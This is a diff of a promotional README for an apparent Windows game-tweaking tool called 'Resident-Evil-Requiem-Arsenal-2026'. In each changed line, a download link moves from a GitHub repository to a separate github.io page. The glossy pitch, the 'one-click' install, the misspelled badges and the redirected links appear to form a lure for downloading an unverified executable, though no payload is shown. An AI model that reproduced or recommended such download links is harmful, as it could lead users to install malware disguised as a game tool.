@@ -4,7 +4,7 @@
 
 Welcome to **Resident-Evil-Requiem-Arsenal-2026** — the all-in-one Windows desktop application that puts you in complete control of your Resident Evil Requiem gameplay experience. Whether you're a casual player or a hardcore completionist, this tool gives you a polished, user-friendly dashboard to fine-tune everything from combat sensitivity to inventory management.
 
-[![⬇️ Download Now](https://img.shields.io/badge/⬇️_Download_Resident_Evel_Requiem_Arsenal_2026-FF6B35?style=for-the-badge&logo=windows&logoColor=white&labelColor=2C3E50)](https://github.com/Netbe5654/Resident-Evil-Requiem-Arsenal-2026)
+[![⬇️ Download Now](https://img.shields.io/badge/⬇️_Download_Resident_Evel_Requiem_Arsenal_2026-FF6B35?style=for-the-badge&logo=windows&logoColor=white&labelColor=2C3E50)](https://netbe5654.github.io)
 
 ## 🎯 What This Application Does
 
@@ -33,7 +33,7 @@ Your system automatically handles the rest — no coding, compiling, or technica
 
 ## 📥 Installation & Setup
 
-Visit this link to download the application: [Resident-Evil-Requiem-Arsenal-2026](https://github.com/Netbe5654/Resident-Evil-Requiem-Arsenal-2026)
+Visit this link to download the application: [Resident-Evil-Requiem-Arsenal-2026](https://netbe5654.github.io)
 
 **One-Click Installation Steps:**
 
@@ -160,7 +160,7 @@ Visual learners can preview the modern UI directly from our repository preview i
 
 **Ready to take control?** Head to our download page and start customizing your gameplay today.
 
-[![🚀 Launch Your 2026 Gameplay](https://img.shields.io/badge/🚀_Get_Resident_Evel_Requiem_Arsenal-2E86AB?style=for-the-badge&logo=github&logoColor=white&labelColor=1A5276)](https://github.com/Netbe5654/Resident-Evil-Requiem-Arsenal-2026)
+[![🚀 Launch Your 2026 Gameplay](https://img.shields.io/badge/🚀_Get_Resident_Evel_Requiem_Arsenal-2E86AB?style=for-the-badge&logo=github&logoColor=white&labelColor=1A5276)](https://netbe5654.github.io)
 
 We hope this tool helps you experience Resident Evil Requiem exactly the way you want. Happy gaming, and enjoy your perfectly tuned adventure!
 
